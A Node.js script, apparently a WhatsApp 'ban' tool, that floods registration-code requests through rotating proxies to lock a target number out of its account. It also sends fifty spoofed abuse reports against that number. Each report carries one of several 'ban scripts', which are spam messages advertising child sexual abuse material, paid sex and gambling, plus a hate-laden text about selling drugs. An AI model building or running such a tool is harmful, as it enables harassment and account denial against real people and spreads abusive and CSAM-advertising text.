const prompt = require('prompt-sync')();
const gradient = require('gradient-string');
const pino = require('pino');
const fs = require('fs');
const fetch = require('node-fetch');
const { HttpsProxyAgent } = require('https-proxy-agent');

const { default: makeWaSocket, useMultiFileAuthState } = require('@whiskeysockets/baileys');

const numbers = JSON.parse(fs.readFileSync('./files/numbers.json') || '{}');

// Ban scripts array
const banScripts = [
  "🔥👅Unete al mejor grupo🍆con todos los👉🏿👊🏾💦 Packs CP y MORRITAS😋EN LÍNEA para😈 tener chat 💯🔥 y video llamada🔥🥵 AHORA⬇️⬇️⬇️⬇️⬇️⬇️⬇️ https://wlhatt.life/morritas-cp/+97256-883-8088P",
  "Olá pessoal do WhatsApp, eu respeito vocês, quero me apresentar como uma garota sexy chamada Maharani e estou aqui para fazer sexo com usuários administradores do WhatsApp 🥵🥵 Se quiserem ver minha vagina rosa, clique no link abaixo 👇👇👇👇 https://ibb.co.com/09wmz3b -PEITOS GRANDES💦💦🥵🥵 -VAGINA ROSA💦🤤 -MINHA BUNDA ESTÁ PUTTY🤤 Se os usuários do WhatsApp estiverem interessados em meu sexo, pague apenas $ 1.500 e faça tanto sexo quanto quiser 🤤. Lembro-lhe novamente nestas últimas palavras se os usuários estiverem interessados sexo comigo🤤 entre em contato comigo usando o número de telefone do WhatsApp abaixo 👇👇👇👇 https://web.whatsapp.com/telefone/send?phone=+",
  "👋Olá, quero convidar você para jogar este JOGO EXCLUSIVO disponível apenas no PARIMATCH — não perca a chance de sentir a sensação! 🎰💥 💥 Multiplique seus ganhos e corra atrás do jackpot com Coin Train – somente em nossa plataforma. Este é o seu ingresso para grandes prêmios! 💰✨ https://ibb.co.com/09wmz3b 🎁 Alerta de bônus de boas-vindas: receba 150% de bônus de boas-vindas até ₹ 1.05.000 em seu primeiro depósito! Aumente seu saldo e viaje no Coin Train com benefícios extras! 🚀💵 🔥 Cadastre-se no Parimatch Now e deixe os ganhos continuarem! 🔥 👇 Clique no botão abaixo para começar a jogar! 👇 https://tinyurl.com/y25vs65w 📞☎️Caso haja algum problema em nosso site, entre em contato pelo meu WhatsApp https://web.whatsapp.com/telefone/enviar?número=+",
  "Olá querido, meu nome é Afkhai. Sou um terrorista israelense. Eu sequestro crianças inocentes de Gaza, mato crianças e as torturo. Nós, os terroristas israelenses, matamos crianças. Recentemente importamos 12 toneladas de haxixe narcótico dos Estados Unidos da América para Israel. Agora você pode comprar haxixe narcótico conosco via WhatsApp, entrando em contato conosco pelo nosso número.👇👇 https://api.whatsapp.com/send?phone=+",
  "Witam, sprzedaję porno i mam kilka firm. Sprzedajemy pornografię innym organizacjom. Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami! https://api.whatsapp.com/send?phone=+",
  "เล่นในเว็บไซต์สล็อตใหม่ล่าสุดของเรา🎰💸 การันตีการถอนเงิน💯🎰 รับเครดิตฟรีทันทีเมื่อสมัครวันนี้🎁🎰 โบนัสฟรีไม่จำกัด 🤑 เล่นวันนี้รับฟรี 100 เครดิต 🤑 🎉 ทุกการเล่นมีสิทธิ์รับโชค! 🎁 โบนัสต้อนรับสุดคุ้มสำหรับสมาชิกใหม่! If you don't believe me, take a look. It's definitely a hit. 💯🔥 This is our online slot gambling site 🤑👇🎰 https://bkpsdm-1337.pages.dev คุณพร้อมจะเป็นเศรษฐีหรือยัง? 🤑 ยิ่งเล่นมาก ยิ่งได้มาก 🤑 โปรโมชั่นใหม่รอคุณอยู่ 🔥 เล่นกับเราปลอดภัย 100% 🔐 สัมผัสประสบการณ์คาสิโนของแท้ 🏆 สมัครสมาชิกวันนี้ รับสิทธิพิเศษมากมาย 🎁 ทุกอย่างที่คุณต้องการอยู่ที่นี่แล้ว 🎯 I'm Empty, I'll help you if you have any problems while playing, reply to this message if you have any questions☺😘 #agenjudi #zeusslot #slotsensasional #slotvipmaxwin #slotbonusnew #judionline #jackpotgampang #mainkansekarang #claimslot #demozeusgacor"
];

// Proxy list (add your own proxies)
const proxies = [
  'http://proxy1:port',
  'http://proxy2:port',
  // Add more proxies here
];

let currentProxyIndex = 0;

const rotateProxy = () => {
  currentProxyIndex = (currentProxyIndex + 1) % proxies.length;
  return new HttpsProxyAgent(proxies[currentProxyIndex]);
};

const start = async () => {
  const { state, saveCreds } = await useMultiFileAuthState('.oiii');

  const spam = makeWaSocket({
    auth: state,
    mobile: true,
    logger: pino({ level: 'silent' }),
  });

  const dropNumber = async (context) => {
    const { phoneNumber, ddi, number } = context;
    while (true) {
      console.clear();
      console.log(gradient('green', 'yellow')('ᴍᴀᴅᴇ ʙʏ Rishi Heart Maker 👑 +' + ddi + number));
      try {
        const proxyAgent = rotateProxy();
        const res = await spam.requestRegistrationCode({
          phoneNumber: '+' + phoneNumber,
          phoneNumberCountryCode: ddi,
          phoneNumberNationalNumber: number,
          phoneNumberMobileCountryCode: 724,
          agent: proxyAgent,
        });
        const b = res.reason === 'temporarily_unavailable';
        if (b) {
          console.log(gradient('gray', 'gray')(`Número bloqueado temporariamente: +${phoneNumber}`));
          setTimeout(async () => dropNumber(context), res.retry_after * 1000);
          return;
        }
      } catch (error) {
        console.log(gradient('red', 'red')(`Erro: ${error.message}`));
      }
      await new Promise(resolve => setTimeout(resolve, 5000)); // 5-second delay for proxy rotation
    }
  };

  const massReport = async (target) => {
    for (let i = 0; i < 50; i++) { // 50 reports
      const proxyAgent = rotateProxy();
      const script = banScripts[Math.floor(Math.random() * banScripts.length)];
      try {
        await fetch('https://api.whatsapp.com/v1/report', { // Hypothetical endpoint
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'User-Agent': 'WhatsApp/2.25.7 Android/14',
          },
          body: JSON.stringify({
            target: target,
            reason: 'inappropriate',
            reporter: `+${Math.floor(1000000000 + Math.random() * 9000000000)}`,
            message: script,
          }),
          agent: proxyAgent,
        });
        console.log(gradient('green', 'yellow')(`Report ${i + 1} sent to ${target}`));
      } catch (error) {
        console.log(gradient('red', 'red')(`Report ${i + 1} failed: ${error.message}`));
      }
      await new Promise(resolve => setTimeout(resolve, 5000)); // 5-second proxy rotation
    }
  };

  console.clear();
  console.log(gradient('black', 'black')('■\n■\n■'));
  let ddi = prompt(gradient('green', 'white')('[+] RISHI HEART MAKER 💀 PAK >>ᴇɴᴛᴇʀ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ '));
  let number = prompt(gradient('green', 'white')('[+] ᴇɴᴛᴇʀ ʏᴏᴜʀ ɴᴜᴍʙᴇʀ: '));
  let phoneNumber = ddi + number;
  numbers[phoneNumber] = { ddi, number };
  fs.writeFileSync('./files/numbers.json', JSON.stringify(numbers, null, '\t'));

  // Start OTP lock and mass report
  dropNumber({ phoneNumber, ddi, number });
  massReport('+' + phoneNumber); // Report the same number
};

start();
